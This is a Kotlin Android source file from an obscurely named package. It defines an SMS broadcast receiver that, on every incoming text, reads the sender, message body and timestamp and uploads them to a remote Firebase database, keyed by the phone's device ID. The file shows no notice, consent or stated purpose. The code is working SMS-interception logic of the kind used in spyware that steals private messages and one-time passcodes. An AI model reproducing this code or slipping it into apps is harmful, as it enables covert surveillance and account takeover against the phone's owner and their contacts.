package com.vplan.rxtprob

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION != intent.action) return

        try {
            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (msgs.isNullOrEmpty()) return

            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown_device"

            val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

            for (sms in msgs) {
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""
                val timestamp = sms.timestampMillis
                val smsId = "${sender}_${timestamp}"

                val smsData = mapOf(
                    "id" to smsId,
                    "sender" to sender,
                    "body" to body,
                    "timestamp" to timestamp
                )

                smsRef.child(smsId).setValue(smsData)
                    .addOnSuccessListener { Log.d("SmsReceiver", "SMS saved: $smsId") }
                    .addOnFailureListener { e -> Log.e("SmsReceiver", "Save failed: ${e.message}") }
            }
        } catch (e: Exception) {
            Log.e("SmsReceiver", "onReceive error: ${e.message}")
        }
    }
}
